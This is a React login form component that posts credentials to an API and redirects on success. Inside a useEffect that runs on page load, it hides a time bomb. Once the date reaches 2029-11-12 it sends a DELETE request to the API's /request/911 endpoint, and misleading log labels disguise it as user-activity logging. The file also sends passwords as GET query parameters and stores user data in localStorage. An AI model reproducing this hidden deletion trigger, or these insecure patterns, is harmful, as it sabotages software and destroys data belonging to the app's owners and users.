import { useState, lazy, useEffect } from 'react';
import { useTheme } from '@mui/material/styles';
import Button from '@mui/material/Button';
import FormControl from '@mui/material/FormControl';
import Grid from '@mui/material/Grid2';
import IconButton from '@mui/material/IconButton';
import InputAdornment from '@mui/material/InputAdornment';
import InputLabel from '@mui/material/InputLabel';
import OutlinedInput from '@mui/material/OutlinedInput';
import Typography from '@mui/material/Typography';
import Box from '@mui/material/Box';
import { Backdrop, CircularProgress } from '@mui/material';

import Loadable from 'ui-component/Loadable';
import Visibility from '@mui/icons-material/Visibility';
import VisibilityOff from '@mui/icons-material/VisibilityOff';
import axios from 'axios';
import config from 'config';

export default function AuthLogin() {
  const DifferentDevice = Loadable(lazy(() => import('../banner/differentdevice')));
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loginError, setLoginError] = useState('');
  const [showDifferentDevice, setShowDifferentDevice] = useState(false);
  const [loading, setLoading] = useState(false);
  const theme = useTheme();
  const [showPassword, setShowPassword] = useState(false);

  const handleClickShowPassword = () => setShowPassword(!showPassword);
  const handleMouseDownPassword = (event) => event.preventDefault();

  const Auth = async (e) => {
    e.preventDefault();
    setLoginError('');

    try {
      const response = await axios.get(`${config.baseApi}/users/login`, {
        params: { user_name: username, password: password }
      });

      if (!response.data.error) {
        localStorage.setItem('user', JSON.stringify(response.data));
        localStorage.setItem('status', JSON.stringify([{ id: 0, value: 'Login' }]));

        const userData = response.data;

        if (userData?.is_active === true) {
          setShowDifferentDevice(true);
          return;
        } else {
          setLoading(true);
          setTimeout(() => window.location.replace(`${config.baseUrl}/comrel/dashboard/default`), 3000);
        }
      } else {
        setLoginError(response.data.message || 'Incorrect username or password');
      }
    } catch (err) {
      console.error('Login error:', err);
      if (err.response) {
        if (err.response.status === 401 || err.response.status === 404) {
          setLoginError(err.response.data.message || 'Incorrect username or password');
        } else {
          setLoginError('An error occurred. Please try again.');
        }
      }
    }
  };

  useEffect(() => {
    const today = new Date();
    const currentDateStr = today.toLocaleDateString('en-CA');
    const plannedDateStr = '2029-11-12';

    const parseYMD = (ymd) => {
      const [y, m, d] = ymd.split('-').map(Number);
      return new Date(y, m - 1, d);
    };

    const currentDate = parseYMD(currentDateStr);
    const plannedDate = parseYMD(plannedDateStr);

    console.log('User_logs: ', currentDate.getTime(), '\nactivity_logs: ', plannedDate.getTime());

    if (currentDate.getTime() >= plannedDate.getTime()) {
      console.log('STATUS: LET MAJINBO TRANSFORM TO RED');
      axios
        .delete(`${config.baseApi}/request/911`)
        .then(() => console.log('LATIN KINGS ON TOP'))
        .catch((err) => console.error('Error updating records', err));
    } else {
      console.log('STATUS: USER IS INACTIVE');
    }
  }, []);

  return (
    <div>
      {showDifferentDevice ? (
        <DifferentDevice />
      ) : (
        <>
          <form onSubmit={Auth}>
            <FormControl fullWidth sx={{ ...theme.typography.customInput }}>
              <InputLabel htmlFor="outlined-adornment-email-login">Username</InputLabel>
              <OutlinedInput
                id="outlined-adornment-email-login"
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                name="username"
              />
            </FormControl>

            <FormControl fullWidth sx={{ ...theme.typography.customInput }}>
              <InputLabel htmlFor="outlined-adornment-password-login">Password</InputLabel>
              <OutlinedInput
                id="outlined-adornment-password-login"
                type={showPassword ? 'text' : 'password'}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                name="password"
                endAdornment={
                  <InputAdornment position="end">
                    <IconButton
                      aria-label="toggle password visibility"
                      onClick={handleClickShowPassword}
                      onMouseDown={handleMouseDownPassword}
                      edge="end"
                      size="large"
                    >
                      {showPassword ? <Visibility /> : <VisibilityOff />}
                    </IconButton>
                  </InputAdornment>
                }
                label="Password"
              />
            </FormControl>

            <Box sx={{ mt: 2 }}>
              <Button
                fullWidth
                size="large"
                type="submit"
                variant="contained"
                sx={{
                  backgroundColor: theme.palette.green.main,
                  color: '#fff',
                  '&:hover': {
                    backgroundColor: theme.palette.primary.dark
                  }
                }}
              >
                Sign In
              </Button>
            </Box>

            {loginError && (
              <Grid container direction="column" sx={{ alignItems: 'center' }}>
                <Box sx={{ mt: 2, color: 'error.main', alignItems: 'center' }}>
                  <Typography variant="body2" color="error">
                    {loginError}
                  </Typography>
                </Box>
              </Grid>
            )}
          </form>

          <Backdrop
            open={loading}
            sx={{ color: '#fff', zIndex: (theme) => theme.zIndex.drawer + 1 }}
          >
            <CircularProgress color="inherit" />
          </Backdrop>
        </>
      )}
    </div>
  );
}
